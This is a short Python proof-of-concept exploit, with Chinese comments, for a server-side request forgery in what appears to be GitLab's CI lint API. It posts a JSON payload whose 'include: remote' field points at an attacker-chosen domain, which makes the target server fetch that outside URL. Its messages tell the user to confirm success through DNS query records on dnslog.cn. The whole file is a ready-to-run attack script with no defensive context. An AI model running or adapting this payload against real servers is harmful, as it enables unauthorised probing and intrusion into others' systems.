import requests
import argparse

if __name__ == '__main__':
    parse=argparse.ArgumentParser()
    parse.add_argument("url",type=str)
    parse.add_argument("-d","--domain",type=str,required=True)

    arguments=parse.parse_args()
    url=arguments.url
    domain=arguments.domain

    req=requests.session()
    req.proxies = {'http': "http://127.0.0.1:8080", 'https': "http://127.0.0.1:8080"} #python3.7以上代理格式修复
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Accept-Encoding":"gzip",
        "Connection":"close",
        "Content-Type":"application/json",
        "Content-Length":"112"
    }

    payload="{ \"include_merged_yaml\": true,\"content\": \"include:\\n  remote: http://"+domain+"/api/v1/targets?test.yml\"}"



    resq=req.post(url+"/api/v4/ci/lint",headers=headers,data=payload)
    if resq.status_code == 200:
        print("poc发送成功")
        print("请访问www.dnslog.cn查看是否有DNS Query Record")
    else:
        print("poc发送失败")




